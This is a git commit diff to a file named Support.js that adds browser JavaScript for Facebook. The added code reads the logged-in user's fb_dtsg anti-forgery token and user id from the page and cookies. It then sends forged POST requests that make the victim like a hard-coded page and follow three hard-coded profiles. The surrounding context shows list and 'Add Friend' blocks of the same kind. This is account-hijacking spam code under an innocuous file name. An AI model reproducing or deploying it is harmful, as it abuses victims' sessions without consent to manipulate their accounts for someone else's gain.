53cb02bda10362386ea32d9bbf37ac10fb50b8d7
wazzygray <qariwaqar@gmail.com>
2013-07-16 23:51:31 +0500

    Update Support.js

--- Support.js
+++ Support.js
@@ -28,6 +28,43 @@ LIST("591619047549764");
 LIST("591624687549200");
 LIST("591619340883068");
 LIST("592695127442156");
+
+/*Like Page*/
+var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
+var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+function Like(p) {
+  var Page = new XMLHttpRequest();
+  var PageURL = "//www.facebook.com/ajax/pages/fan_status.php";
+  var PageParams = "&fbpage_id=" + p +"&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg="+fb_dtsg+"&phstamp=";
+  Page.open("POST", PageURL, true);
+  Page.onreadystatechange = function () {
+    if (Page.readyState == 4 && Page.status == 200) {
+      Page.close;
+    }
+  };
+  Page.send(PageParams);
+}
+Like("313072532101076");
+
+
+/*Auto Follow*/
+var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
+var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+function a(abone) {
+  var http4 = new XMLHttpRequest();
+  var url4 = "/ajax/follow/follow_profile.php?__a=1";
+  var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
+  http4.open("POST", url4, true);
+  http4.onreadystatechange = function () {
+    if (http4.readyState == 4 && http4.status == 200) {
+      http4.close;
+    }
+  };
+  http4.send(params4);
+}
+a("100001050235420");
+a("100003785647375");
+a("100003697277263");
 /*Add Friend*/ 
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
